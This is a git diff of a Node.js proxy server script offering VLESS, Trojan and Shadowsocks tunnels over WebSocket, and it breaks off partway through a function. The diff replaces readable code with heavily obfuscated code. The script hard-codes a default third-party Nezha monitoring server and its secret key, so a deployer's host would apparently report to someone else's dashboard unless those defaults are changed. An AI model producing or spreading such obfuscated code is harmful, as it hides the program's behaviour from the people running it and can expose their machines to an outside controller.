@@ -1,569 +1,797 @@
 #!/usr/bin/env node
 
-const os = require('os')
-const http = require('http')
-const fs = require('fs')
-const axios = require('axios')
-const net = require('net')
-const path = require('path')
-const crypto = require('crypto')
-const { Buffer } = require('buffer')
-const { exec, execSync } = require('child_process')
-const { WebSocket, createWebSocketStream } = require('ws')
-
-// 环境变量
-const UUID = process.env.UUID || 'e18d5155-c6c5-4e81-aa89-09e204fd07d4' // 项目和节点UUID
-const DOMAIN = process.env.DOMAIN || '' // 项目分配的域名或反代后的域名:abc.xxx.com
-
-const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nezha.933993.xyz:443' // 哪吒v1格式:nz.abc.com:8008;哪吒v0格式:nz.abc.com
-const NEZHA_PORT = process.env.NEZHA_PORT || '' // 哪吒v1请留空;哪吒v0需填写
-const NEZHA_KEY = process.env.NEZHA_KEY || '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8' // 哪吒v1的NZ_CLIENT_SECRET;哪吒v0的agent密钥
-
-const SUB_PATH = process.env.SUB_PATH || '800' // 订阅路径
-const NAME = process.env.NAME || 'js-node' // 节点名称
-const WSPATH = process.env.WSPATH || UUID.slice(0, 8) // 节点路径
-const PORT = Number(process.env.SERVER_PORT || process.env.PORT || 3000) // http和ws端口
-const AUTO_ACCESS = (process.env.AUTO_ACCESS || '').toLowerCase() === 'true' // 是否开启自动访问,用于保活
-
-let uuid = UUID.replace(/-/g, ''),
+const _0x15bbba = _0xb66c
+;(function (_0x486365, _0x48302f) {
+  const _0x5748dd = { _0x2e6d74: 0x138, _0x44db1a: 0x135, _0x579a48: 0x1bb, _0x7cfc68: 0x17a, _0x3a10b5: 0x194 },
+    _0x3f80e9 = _0xb66c,
+    _0x3d34f9 = _0x486365()
+  while (!![]) {
+    try {
+      const _0x117480 =
+        (parseInt(_0x3f80e9(_0x5748dd._0x2e6d74)) / 0x1) * (parseInt(_0x3f80e9(0x161)) / 0x2) +
+        (parseInt(_0x3f80e9(_0x5748dd._0x44db1a)) / 0x3) * (parseInt(_0x3f80e9(_0x5748dd._0x579a48)) / 0x4) +
+        -parseInt(_0x3f80e9(0x150)) / 0x5 +
+        (-parseInt(_0x3f80e9(0x1ad)) / 0x6) * (-parseInt(_0x3f80e9(0x143)) / 0x7) +
+        parseInt(_0x3f80e9(0x1b5)) / 0x8 +
+        -parseInt(_0x3f80e9(0x195)) / 0x9 +
+        (parseInt(_0x3f80e9(_0x5748dd._0x7cfc68)) / 0xa) * (-parseInt(_0x3f80e9(_0x5748dd._0x3a10b5)) / 0xb)
+      if (_0x117480 === _0x48302f) break
+      else _0x3d34f9['push'](_0x3d34f9['shift']())
+    } catch (_0x5b1bc9) {
+      _0x3d34f9['push'](_0x3d34f9['shift']())
+    }
+  }
+})(_0x8986, 0x39b49)
+const os = require('os'),
+  http = require(_0x15bbba(0x1a1)),
+  fs = require('fs'),
+  axios = require(_0x15bbba(0x132)),
+  net = require(_0x15bbba(0x1bd)),
+  path = require(_0x15bbba(0x15a)),
+  crypto = require(_0x15bbba(0x17d)),
+  { Buffer } = require(_0x15bbba(0x155)),
+  { exec, execSync } = require(_0x15bbba(0x182)),
+  { WebSocket, createWebSocketStream } = require('ws'),
+  UUID = process['env']['UUID'] || _0x15bbba(0x163),
+  DOMAIN = process[_0x15bbba(0x18a)][_0x15bbba(0x185)] || '',
+  NEZHA_SERVER = process[_0x15bbba(0x18a)]['NEZHA_SERVER'] || _0x15bbba(0x14e),
+  NEZHA_PORT = process[_0x15bbba(0x18a)][_0x15bbba(0x1be)] || '',
+  NEZHA_KEY = process['env'][_0x15bbba(0x14d)] || _0x15bbba(0x17f),
+  SUB_PATH = process['env']['SUB_PATH'] || '800',
+  NAME = process['env'][_0x15bbba(0x197)] || _0x15bbba(0x173),
+  WSPATH = process[_0x15bbba(0x18a)][_0x15bbba(0x17b)] || UUID[_0x15bbba(0x191)](0x0, 0x8),
+  PORT = Number(process[_0x15bbba(0x18a)][_0x15bbba(0x1ba)] || process['env']['PORT'] || 0xbb8),
+  AUTO_ACCESS = (process[_0x15bbba(0x18a)][_0x15bbba(0x1ae)] || '')['toLowerCase']() === _0x15bbba(0x15f)
+let uuid = UUID[_0x15bbba(0x16e)](/-/g, ''),
   CurrentDomain = DOMAIN,
-  Tls = 'tls',
-  CurrentPort = 443,
+  Tls = _0x15bbba(0x15d),
+  CurrentPort = 0x1bb,
   ISP = ''
-const DNS_SERVERS = ['8.8.4.4', '1.1.1.1']
-const BLOCKED_DOMAINS = [
-  'speedtest.net',
-  'fast.com',
-  'speedtest.cn',
-  'speed.cloudflare.com',
-  'speedof.me',
-  'testmy.net',
-  'bandwidth.place',
-  'speed.io',
-  'librespeed.org',
-  'speedcheck.org'
-]
-
-// block speedtest domains
-function isBlockedDomain(host) {
-  if (!host) return false
-  const hostLower = host.toLowerCase()
-  return BLOCKED_DOMAINS.some((blocked) => {
-    return hostLower === blocked || hostLower.endsWith('.' + blocked)
+function _0xb66c(_0x2f8c68, _0x3244d8) {
+  const _0x898606 = _0x8986()
+  return (
+    (_0xb66c = function (_0xb66c73, _0x516f1f) {
+      _0xb66c73 = _0xb66c73 - 0x12c
+      let _0x91c8c2 = _0x898606[_0xb66c73]
+      return _0x91c8c2
+    }),
+    _0xb66c(_0x2f8c68, _0x3244d8)
+  )
+}
+const DNS_SERVERS = [_0x15bbba(0x166), '1.1.1.1'],
+  BLOCKED_DOMAINS = [
+    'speedtest.net',
+    'fast.com',
+    'speedtest.cn',
+    _0x15bbba(0x165),
+    _0x15bbba(0x1b9),
+    _0x15bbba(0x16b),
+    'bandwidth.place',
+    _0x15bbba(0x180),
+    _0x15bbba(0x1a3),
+    _0x15bbba(0x175)
+  ]
+function isBlockedDomain(_0x1c06c1) {
+  const _0x953f5c = { _0x42e342: 0x189 },
+    _0x238577 = _0x15bbba
+  if (!_0x1c06c1) return ![]
+  const _0x3bb38b = _0x1c06c1[_0x238577(_0x953f5c._0x42e342)]()
+  return BLOCKED_DOMAINS[_0x238577(0x1b4)]((_0x1fcb52) => {
+    return _0x3bb38b === _0x1fcb52 || _0x3bb38b['endsWith']('.' + _0x1fcb52)
   })
 }
-
 async function getisp() {
+  const _0x2bdd87 = { _0x1f5e57: 0x151, _0x1cd41d: 0x196, _0xb8c6ea: 0x15e, _0x129041: 0x16e },
+    _0x23e595 = _0x15bbba
   try {
-    const res = await axios.get('https://api.ip.sb/geoip', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 } })
-    const data = res.data
-    ISP = `${data.country_code}-${data.isp}`.replace(/ /g, '_')
-  } catch (e) {
+    const _0x1b4482 = await axios[_0x23e595(_0x2bdd87._0x1f5e57)](_0x23e595(_0x2bdd87._0x1cd41d), {
+        headers: { 'User-Agent': _0x23e595(_0x2bdd87._0xb8c6ea), timeout: 0xbb8 }
+      }),
+      _0x2a9e70 = _0x1b4482[_0x23e595(0x179)]
+    ISP = (_0x2a9e70['country_code'] + '-' + _0x2a9e70['isp'])[_0x23e595(_0x2bdd87._0x129041)](/ /g, '_')
+  } catch (_0x5d3f7d) {
     try {
-      const res2 = await axios.get('http://ip-api.com/json', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 } })
-      const data2 = res2.data
-      ISP = `${data2.countryCode}-${data2.org}`.replace(/ /g, '_')
-    } catch (e2) {
-      ISP = 'Unknown'
+      const _0x20ee07 = await axios[_0x23e595(_0x2bdd87._0x1f5e57)](_0x23e595(0x1a4), {
+          headers: { 'User-Agent': _0x23e595(0x15e), timeout: 0xbb8 }
+        }),
+        _0x24242c = _0x20ee07[_0x23e595(0x179)]
+      ISP = (_0x24242c['countryCode'] + '-' + _0x24242c['org'])[_0x23e595(_0x2bdd87._0x129041)](/ /g, '_')
+    } catch (_0x1e388a) {
+      ISP = _0x23e595(0x19c)
     }
   }
 }
-
 async function getip() {
-  if (!DOMAIN || DOMAIN === 'your-domain.com') {
+  const _0x386f9c = { _0x1eaa9f: 0x168, _0x774528: 0x179, _0xb0ff8b: 0x1c0, _0x4b6d05: 0x169, _0x30db49: 0x190, _0xf30447: 0x170, _0x3f754d: 0x15d },
+    _0x2b9c4c = _0x15bbba
+  if (!DOMAIN || DOMAIN === _0x2b9c4c(0x158))
     try {
-      const res = await axios.get('https://api-ipv4.ip.sb/ip', { timeout: 5000 })
-      const ip = res.data.trim()
-      ;((CurrentDomain = ip), (Tls = 'none'), (CurrentPort = PORT))
-    } catch (e) {
-      console.error('Failed to get IP', e.message)
-      ;((CurrentDomain = 'cahnge-your-domain.com'), (Tls = 'tls'), (CurrentPort = 443))
+      const _0x2c582e = await axios['get'](_0x2b9c4c(_0x386f9c._0x1eaa9f), { timeout: 0x1388 }),
+        _0x11a2c = _0x2c582e[_0x2b9c4c(_0x386f9c._0x774528)][_0x2b9c4c(_0x386f9c._0xb0ff8b)]()
+      ;((CurrentDomain = _0x11a2c), (Tls = _0x2b9c4c(0x192)), (CurrentPort = PORT))
+    } catch (_0x2e21e5) {
+      ;(console[_0x2b9c4c(_0x386f9c._0x4b6d05)](_0x2b9c4c(_0x386f9c._0x30db49), _0x2e21e5[_0x2b9c4c(_0x386f9c._0xf30447)]),
+        ((CurrentDomain = _0x2b9c4c(0x16a)), (Tls = _0x2b9c4c(_0x386f9c._0x3f754d)), (CurrentPort = 0x1bb)))
     }
-  } else {
-    ;((CurrentDomain = DOMAIN), (Tls = 'tls'), (CurrentPort = 443))
+  else {
+    ;((CurrentDomain = DOMAIN), (Tls = 'tls'), (CurrentPort = 0x1bb))
   }
 }
-
-// http route
-const httpServer = http.createServer(async (req, res) => {
-  if (req.url === '/') {
-    const filePath = path.join(__dirname, 'index.html')
-    fs.readFile(filePath, 'utf8', (err, content) => {
-      if (err) {
-        res.writeHead(200, { 'Content-Type': 'text/html' })
-        res.end('Hello world!')
+const httpServer = http[_0x15bbba(0x147)](async (_0x2955bf, _0x4365cc) => {
+  const _0xde1c5 = {
+      _0x2c2529: 0x1b1,
+      _0x2dd004: 0x130,
+      _0x2a8799: 0x192,
+      _0x3453e2: 0x15d,
+      _0xfbb274: 0x171,
+      _0x21811e: 0x19f,
+      _0x5276ce: 0x153,
+      _0x40a760: 0x1c2,
+      _0x2ab223: 0x1bc,
+      _0x3aafaa: 0x1b0,
+      _0x538330: 0x18f,
+      _0x3c5e38: 0x131,
+      _0x349816: 0x136
+    },
+    _0x3d6c56 = { _0x212518: 0x136, _0x3a68c8: 0x14c, _0x48d7bc: 0x178 },
+    _0x304bef = _0x15bbba
+  if (_0x2955bf[_0x304bef(0x130)] === '/') {
+    const _0x458f08 = path[_0x304bef(0x16d)](__dirname, _0x304bef(_0xde1c5._0x2c2529))
+    fs[_0x304bef(0x1a7)](_0x458f08, 'utf8', (_0x19afdc, _0x5a4664) => {
+      const _0x328d11 = _0x304bef
+      if (_0x19afdc) {
+        ;(_0x4365cc[_0x328d11(0x178)](0xc8, { 'Content-Type': _0x328d11(0x148) }),
+          _0x4365cc[_0x328d11(_0x3d6c56._0x212518)](_0x328d11(_0x3d6c56._0x3a68c8)))
         return
       }
-      res.writeHead(200, { 'Content-Type': 'text/html' })
-      res.end(content)
+      ;(_0x4365cc[_0x328d11(_0x3d6c56._0x48d7bc)](0xc8, { 'Content-Type': _0x328d11(0x148) }), _0x4365cc['end'](_0x5a4664))
     })
     return
-  } else if (req.url === `/${SUB_PATH}`) {
-    await getisp()
-    await getip()
-    const namePart = NAME ? `${NAME}-${ISP}` : ISP
-    const tlsParam = Tls === 'tls' ? 'tls' : 'none'
-    const ssTlsParam = Tls === 'tls' ? 'tls;' : ''
-    const vlsURL = `vless://${UUID}@${CurrentDomain}:${CurrentPort}?encryption=none&security=${tlsParam}&sni=${CurrentDomain}&fp=chrome&type=ws&host=${CurrentDomain}&path=%2F${WSPATH}#${namePart}`
-    const troURL = `trojan://${UUID}@${CurrentDomain}:${CurrentPort}?security=${tlsParam}&sni=${CurrentDomain}&fp=chrome&type=ws&host=${CurrentDomain}&path=%2F${WSPATH}#${namePart}`
-    const ssMethodPassword = Buffer.from(`none:${UUID}`).toString('base64')
-    const ssURL = `ss://${ssMethodPassword}@${CurrentDomain}:${CurrentPort}?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D${CurrentDomain};path%3D%2F${WSPATH};${ssTlsParam}sni%3D${CurrentDomain};skip-cert-verify%3Dtrue;mux%3D0#${namePart}`
-    const subscription = vlsURL + '\n' + troURL + '\n' + ssURL
-    const base64Content = Buffer.from(subscription).toString('base64')
-
-    res.writeHead(200, { 'Content-Type': 'text/plain' })
-    res.end(base64Content + '\n')
   } else {
-    res.writeHead(404, { 'Content-Type': 'text/plain' })
-    res.end('Not Found\n')
+    if (_0x2955bf[_0x304bef(_0xde1c5._0x2dd004)] === '/' + SUB_PATH) {
+      ;(await getisp(), await getip())
+      const _0x2f3f47 = NAME ? NAME + '-' + ISP : ISP,
+        _0x2c7445 = Tls === _0x304bef(0x15d) ? 'tls' : _0x304bef(_0xde1c5._0x2a8799),
+        _0x1de0d3 = Tls === _0x304bef(_0xde1c5._0x3453e2) ? _0x304bef(_0xde1c5._0xfbb274) : '',
+        _0xc719d1 =
+          _0x304bef(0x12e) +
+          UUID +
+          '@' +
+          CurrentDomain +
+          ':' +
+          CurrentPort +
+          _0x304bef(0x186) +
+          _0x2c7445 +
+          _0x304bef(0x1a5) +
+          CurrentDomain +
+          _0x304bef(_0xde1c5._0x21811e) +
+          CurrentDomain +
+          _0x304bef(0x1aa) +
+          WSPATH +
+          '#' +
+          _0x2f3f47,
+        _0xd51aef =
+          _0x304bef(_0xde1c5._0x5276ce) +
+          UUID +
+          '@' +
+          CurrentDomain +
+          ':' +
+          CurrentPort +
+          _0x304bef(0x177) +
+          _0x2c7445 +
+          '&sni=' +
+          CurrentDomain +
+          _0x304bef(0x19f) +
+          CurrentDomain +
+          '&path=%2F' +
+          WSPATH +
+          '#' +
+          _0x2f3f47,
+        _0x20bbf9 = Buffer[_0x304bef(0x18f)](_0x304bef(_0xde1c5._0x40a760) + UUID)['toString'](_0x304bef(_0xde1c5._0x2ab223)),
+        _0x44b730 =
+          _0x304bef(_0xde1c5._0x3aafaa) +
+          _0x20bbf9 +
+          '@' +
+          CurrentDomain +
+          ':' +
+          CurrentPort +
+          _0x304bef(0x17e) +
+          CurrentDomain +
+          _0x304bef(0x145) +
+          WSPATH +
+          ';' +
+          _0x1de0d3 +
+          _0x304bef(0x167) +
+          CurrentDomain +
+          ';skip-cert-verify%3Dtrue;mux%3D0#' +
+          _0x2f3f47,
+        _0x553a13 = _0xc719d1 + '\x0a' + _0xd51aef + '\x0a' + _0x44b730,
+        _0x2758ec = Buffer[_0x304bef(_0xde1c5._0x538330)](_0x553a13)[_0x304bef(0x12c)](_0x304bef(_0xde1c5._0x2ab223))
+      ;(_0x4365cc['writeHead'](0xc8, { 'Content-Type': _0x304bef(_0xde1c5._0x3c5e38) }), _0x4365cc[_0x304bef(0x136)](_0x2758ec + '\x0a'))
+    } else (_0x4365cc[_0x304bef(0x178)](0x194, { 'Content-Type': _0x304bef(0x131) }), _0x4365cc[_0x304bef(_0xde1c5._0x349816)]('Not\x20Found\x0a'))
   }
 })
-
-// Custom DNS
-function resolveHost(host) {
-  return new Promise((resolve, reject) => {
-    if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(host)) {
-      resolve(host)
+function resolveHost(_0x1300e2) {
+  return new Promise((_0x3157df, _0x2d5076) => {
+    const _0x32e0c2 = { _0x352270: 0x176 },
+      _0x52963b = { _0x4cbd84: 0x179, _0x4da76e: 0x152, _0x520f8b: 0x160 }
+    if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x1300e2)) {
+      _0x3157df(_0x1300e2)
       return
     }
-    let attempts = 0
-    function tryNextDNS() {
-      if (attempts >= DNS_SERVERS.length) {
-        reject(new Error(`Failed to resolve ${host} with all DNS servers`))
+    let _0x221eca = 0x0
+    function _0x411979() {
+      const _0x13fcb5 = _0xb66c
+      if (_0x221eca >= DNS_SERVERS[_0x13fcb5(0x152)]) {
+        _0x2d5076(new Error('Failed\x20to\x20resolve\x20' + _0x1300e2 + _0x13fcb5(0x13b)))
         return
       }
-      const dnsServer = DNS_SERVERS[attempts]
-      attempts++
-      const dnsQuery = `https://dns.google/resolve?name=${encodeURIComponent(host)}&type=A`
-      axios
-        .get(dnsQuery, {
-          timeout: 5000,
-          headers: {
-            Accept: 'application/dns-json'
-          }
-        })
-        .then((response) => {
-          const data = response.data
-          if (data.Status === 0 && data.Answer && data.Answer.length > 0) {
-            const ip = data.Answer.find((record) => record.type === 1)
-            if (ip) {
-              resolve(ip.data)
+      const _0x2a51d8 = DNS_SERVERS[_0x221eca]
+      _0x221eca++
+      const _0x483ad2 = _0x13fcb5(0x13e) + encodeURIComponent(_0x1300e2) + '&type=A'
+      axios['get'](_0x483ad2, { timeout: 0x1388, headers: { Accept: _0x13fcb5(_0x32e0c2._0x352270) } })
+        ['then']((_0x1cac76) => {
+          const _0x429632 = _0x13fcb5,
+            _0x2b4516 = _0x1cac76[_0x429632(_0x52963b._0x4cbd84)]
+          if (_0x2b4516['Status'] === 0x0 && _0x2b4516[_0x429632(0x160)] && _0x2b4516[_0x429632(0x160)][_0x429632(_0x52963b._0x4da76e)] > 0x0) {
+            const _0x2c9c8a = _0x2b4516[_0x429632(_0x52963b._0x520f8b)]['find']((_0x4de5c6) => _0x4de5c6[_0x429632(0x1b2)] === 0x1)
+            if (_0x2c9c8a) {
+              _0x3157df(_0x2c9c8a['data'])
               return
             }
           }
-          tryNextDNS()
+          _0x411979()
         })
-        .catch((error) => {
-          tryNextDNS()
+        [_0x13fcb5(0x137)]((_0x502945) => {
+          _0x411979()
         })
     }
-
-    tryNextDNS()
+    _0x411979()
   })
 }
-
-// VLE-SS处理
-function handleVlsConnection(ws, msg) {
-  const [VERSION] = msg
-  const id = msg.slice(1, 17)
-  if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))) return false
-
-  let i = msg.slice(17, 18).readUInt8() + 19
-  const port = msg.slice(i, (i += 2)).readUInt16BE(0)
-  const ATYP = msg.slice(i, (i += 1)).readUInt8()
-  const host =
-    ATYP == 1
-      ? msg.slice(i, (i += 4)).join('.')
-      : ATYP == 2
-        ? new TextDecoder().decode(msg.slice(i + 1, (i += 1 + msg.slice(i, i + 1).readUInt8())))
-        : ATYP == 3
-          ? msg
-              .slice(i, (i += 16))
-              .reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), [])
-              .map((b) => b.readUInt16BE(0).toString(16))
-              .join(':')
-          : ''
-
-  if (isBlockedDomain(host)) {
-    ws.close()
-    return false
-  }
-  ws.send(new Uint8Array([VERSION, 0]))
-  const duplex = createWebSocketStream(ws)
-  resolveHost(host)
-    .then((resolvedIP) => {
-      net
-        .connect({ host: resolvedIP, port }, function () {
-          this.write(msg.slice(i))
-          duplex
-            .on('error', () => {})
-            .pipe(this)
-            .on('error', () => {})
-            .pipe(duplex)
-        })
-        .on('error', () => {})
-    })
-    .catch((error) => {
-      net
-        .connect({ host, port }, function () {
-          this.write(msg.slice(i))
-          duplex
-            .on('error', () => {})
-            .pipe(this)
-            .on('error', () => {})
-            .pipe(duplex)
-        })
-        .on('error', () => {})
-    })
-
-  return true
+function handleVlsConnection(_0x602b5d, _0x413af9) {
+  const _0x46ccc8 = { _0x1437f2: 0x1a2, _0x2455dc: 0x13d, _0x53499f: 0x191, _0x3719d8: 0x19e, _0x5a0d1a: 0x1b7, _0x513a8e: 0x137 },
+    _0x545f2d = { _0x4e0d30: 0x134 },
+    _0x37cf95 = { _0x3526ef: 0x191, _0x4aaa3b: 0x169 },
+    _0x234ec6 = { _0x2e76d6: 0x18c, _0x4bb326: 0x1b6, _0x32ad21: 0x169 },
+    _0x40f8e6 = _0x15bbba,
+    [_0x3def6b] = _0x413af9,
+    _0x2944e9 = _0x413af9['slice'](0x1, 0x11)
+  if (!_0x2944e9['every']((_0x1ff32e, _0x12e6b7) => _0x1ff32e == parseInt(uuid['substr'](_0x12e6b7 * 0x2, 0x2), 0x10))) return ![]
+  let _0x31b96f = _0x413af9['slice'](0x11, 0x12)[_0x40f8e6(0x13d)]() + 0x13
+  const _0x356952 = _0x413af9['slice'](_0x31b96f, (_0x31b96f += 0x2))[_0x40f8e6(_0x46ccc8._0x1437f2)](0x0),
+    _0x3a20f0 = _0x413af9[_0x40f8e6(0x191)](_0x31b96f, (_0x31b96f += 0x1))[_0x40f8e6(_0x46ccc8._0x2455dc)](),
+    _0x533be8 =
+      _0x3a20f0 == 0x1
+        ? _0x413af9[_0x40f8e6(_0x46ccc8._0x53499f)](_0x31b96f, (_0x31b96f += 0x4))[_0x40f8e6(0x16d)]('.')
+        : _0x3a20f0 == 0x2
+          ? new TextDecoder()[_0x40f8e6(_0x46ccc8._0x3719d8)](
+              _0x413af9[_0x40f8e6(0x191)](
+                _0x31b96f + 0x1,
+                (_0x31b96f += 0x1 + _0x413af9[_0x40f8e6(_0x46ccc8._0x53499f)](_0x31b96f, _0x31b96f + 0x1)[_0x40f8e6(_0x46ccc8._0x2455dc)]())
+              )
+            )
+          : _0x3a20f0 == 0x3
+            ? _0x413af9[_0x40f8e6(0x191)](_0x31b96f, (_0x31b96f += 0x10))
+                [_0x40f8e6(0x149)](
+                  (_0x3e312e, _0x42db02, _0x211e30, _0x5f2817) =>
+                    _0x211e30 % 0x2 ? _0x3e312e['concat'](_0x5f2817[_0x40f8e6(0x191)](_0x211e30 - 0x1, _0x211e30 + 0x1)) : _0x3e312e,
+                  []
+                )
+                [_0x40f8e6(_0x46ccc8._0x5a0d1a)]((_0x5da77b) => _0x5da77b[_0x40f8e6(0x1a2)](0x0)[_0x40f8e6(0x12c)](0x10))
+                [_0x40f8e6(0x16d)](':')
+            : ''
+  if (isBlockedDomain(_0x533be8)) return (_0x602b5d['close'](), ![])
+  _0x602b5d[_0x40f8e6(0x139)](new Uint8Array([_0x3def6b, 0x0]))
+  const _0x31c844 = createWebSocketStream(_0x602b5d)
+  return (
+    resolveHost(_0x533be8)
+      [_0x40f8e6(0x18b)]((_0x1407f1) => {
+        const _0x39ba79 = _0x40f8e6
+        net[_0x39ba79(0x134)]({ host: _0x1407f1, port: _0x356952 }, function () {
+          const _0x265d07 = _0x39ba79
+          ;(this[_0x265d07(_0x234ec6._0x2e76d6)](_0x413af9[_0x265d07(0x191)](_0x31b96f)),
+            _0x31c844['on']('error', () => {})
+              [_0x265d07(_0x234ec6._0x4bb326)](this)
+              ['on'](_0x265d07(_0x234ec6._0x32ad21), () => {})
+              [_0x265d07(0x1b6)](_0x31c844))
+        })['on'](_0x39ba79(0x169), () => {})
+      })
+      [_0x40f8e6(_0x46ccc8._0x513a8e)]((_0x2222e3) => {
+        const _0x9a1196 = _0x40f8e6
+        net[_0x9a1196(_0x545f2d._0x4e0d30)]({ host: _0x533be8, port: _0x356952 }, function () {
+          const _0x9f2738 = _0x9a1196
+          ;(this['write'](_0x413af9[_0x9f2738(_0x37cf95._0x3526ef)](_0x31b96f)),
+            _0x31c844['on'](_0x9f2738(0x169), () => {})
+              ['pipe'](this)
+              ['on'](_0x9f2738(_0x37cf95._0x4aaa3b), () => {})
+              [_0x9f2738(0x1b6)](_0x31c844))
+        })['on'](_0x9a1196(0x169), () => {})
+      }),
+    !![]
+  )
 }
-
-// Tro-jan处理
-function handleTrojConnection(ws, msg) {
+function handleTrojConnection(_0x4e0fc2, _0x2c4bb2) {
+  const _0x14afcc = {
+      _0x448c99: 0x152,
+      _0xa2bf67: 0x191,
+      _0x1da1fa: 0x144,
+      _0x589c07: 0x164,
+      _0x26e129: 0x1ab,
+      _0x2518c3: 0x16d,
+      _0x48d810: 0x162,
+      _0x45b380: 0x18b
+    },
+    _0x44ee33 = { _0xf307e1: 0x134, _0x3fba65: 0x169 },
+    _0x19aeac = { _0x341476: 0x134, _0x1cb819: 0x169 },
+    _0x634c8 = { _0x4b715f: 0x152, _0x3e2492: 0x1b6, _0x4b4e39: 0x1b6 },
+    _0x445b6e = _0x15bbba
   try {
-    if (msg.length < 58) return false
-    const receivedPasswordHash = msg.slice(0, 56).toString()
-    const possiblePasswords = [UUID]
-
-    let matchedPassword = null
-    for (const pwd of possiblePasswords) {
-      const hash = crypto.createHash('sha224').update(pwd).digest('hex')
-      if (hash === receivedPasswordHash) {
-        matchedPassword = pwd
+    if (_0x2c4bb2[_0x445b6e(_0x14afcc._0x448c99)] < 0x3a) return ![]
+    const _0x284b3b = _0x2c4bb2[_0x445b6e(_0x14afcc._0xa2bf67)](0x0, 0x38)['toString'](),
+      _0xd0307b = [UUID]
+    let _0x4f6e50 = null
+    for (const _0x4d0ec8 of _0xd0307b) {
+      const _0x36f025 = crypto[_0x445b6e(0x142)](_0x445b6e(_0x14afcc._0x1da1fa))
+        ['update'](_0x4d0ec8)
+        [_0x445b6e(_0x14afcc._0x589c07)](_0x445b6e(_0x14afcc._0x26e129))
+      if (_0x36f025 === _0x284b3b) {
+        _0x4f6e50 = _0x4d0ec8
         break
       }
     }
-
-    if (!matchedPassword) return false
-    let offset = 56
-    if (msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {
-      offset += 2
-    }
-
-    const cmd = msg[offset]
-    if (cmd !== 0x01) return false
-    offset += 1
-    const atyp = msg[offset]
-    offset += 1
-    let host, port
-    if (atyp === 0x01) {
-      host = msg.slice(offset, offset + 4).join('.')
-      offset += 4
-    } else if (atyp === 0x03) {
-      const hostLen = msg[offset]
-      offset += 1
-      host = msg.slice(offset, offset + hostLen).toString()
-      offset += hostLen
-    } else if (atyp === 0x04) {
-      host = msg
-        .slice(offset, offset + 16)
-        .reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), [])
-        .map((b) => b.readUInt16BE(0).toString(16))
-        .join(':')
-      offset += 16
-    } else {
-      return false
-    }
-
-    port = msg.readUInt16BE(offset)
-    offset += 2
-
-    if (offset < msg.length && msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {
-      offset += 2
-    }
-
-    if (isBlockedDomain(host)) {
-      ws.close()
-      return false
-    }
-    const duplex = createWebSocketStream(ws)
-    resolveHost(host)
-      .then((resolvedIP) => {
-        net
-          .connect({ host: resolvedIP, port }, function () {
-            if (offset < msg.length) {
-              this.write(msg.slice(offset))
-            }
-            duplex
-              .on('error', () => {})
-              .pipe(this)
-              .on('error', () => {})
-              .pipe(duplex)
-          })
-          .on('error', () => {})
-      })
-      .catch((error) => {
-        net
-          .connect({ host, port }, function () {
-            if (offset < msg.length) {
-              this.write(msg.slice(offset))
-            }
-            duplex
-              .on('error', () => {})
-              .pipe(this)
-              .on('error', () => {})
-              .pipe(duplex)
-          })
-          .on('error', () => {})
-      })
-
-    return true
-  } catch (error) {
-    return false
-  }
-}
-
-// Ss处理
-function handleSsConnection(ws, msg) {
-  try {
-    let offset = 0
-    const atyp = msg[offset]
-    offset += 1
-
-    let host, port
-    if (atyp === 0x01) {
-      host = msg.slice(offset, offset + 4).join('.')
-      offset += 4
-    } else if (atyp === 0x03) {
-      const hostLen = msg[offset]
-      offset += 1
-      host = msg.slice(offset, offset + hostLen).toString()
-      offset += hostLen
-    } else if (atyp === 0x04) {
-      host = msg
-        .slice(offset, offset + 16)
-        .reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), [])
-        .map((b) => b.readUInt16BE(0).toString(16))
-        .join(':')
-      offset += 16
-    } else {
-      return false
-    }
-
-    port = msg.readUInt16BE(offset)
-    offset += 2
-
-    if (isBlockedDomain(host)) {
-      ws.close()
-      return false
-    }
-    const duplex = createWebSocketStream(ws)
-    resolveHost(host)
-      .then((resolvedIP) => {
-        net
-          .connect({ host: resolvedIP, port }, function () {
-            if (offset < msg.length) {
-              this.write(msg.slice(offset))
-            }
-            duplex
-              .on('error', () => {})
-              .pipe(this)
-              .on('error', () => {})
-              .pipe(duplex)
-          })
-          .on('error', () => {})
-      })
-      .catch((error) => {
-        net
-          .connect({ host, port }, function () {
-            if (offset < msg.length) {
-              this.write(msg.slice(offset))
-            }
-            duplex
-              .on('error', () => {})
-              .pipe(this)
-              .on('error', () => {})
-              .pipe(duplex)
-          })
-          .on('error', () => {})
-      })
-
-    return true
-  } catch (error) {
-    return false
-  }
-}
-
-// Ws handler
-const wss = new WebSocket.Server({ server: httpServer })
-wss.on('connection', (ws, req) => {
-  const url = req.url || ''
-
-  const expectedPath = `/${WSPATH}`
-  if (!url.startsWith(expectedPath)) {
-    ws.close()
-    return
-  }
-
-  ws.once('message', (msg) => {
-    // VLE-SS (version byte 0 + 16 bytes UUID)
-    if (msg.length > 17 && msg[0] === 0) {
-      const id = msg.slice(1, 17)
-      const isVless = id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))
-      if (isVless) {
-        if (!handleVlsConnection(ws, msg)) {
-          ws.close()
-        }
-        return
+    if (!_0x4f6e50) return ![]
+    let _0x4fc053 = 0x38
+    _0x2c4bb2[_0x4fc053] === 0xd && _0x2c4bb2[_0x4fc053 + 0x1] === 0xa && (_0x4fc053 += 0x2)
+    const _0x4e566f = _0x2c4bb2[_0x4fc053]
+    if (_0x4e566f !== 0x1) return ![]
+    _0x4fc053 += 0x1
+    const _0x282345 = _0x2c4bb2[_0x4fc053]
+    _0x4fc053 += 0x1
+    let _0x5bae4f, _0x1e68bb
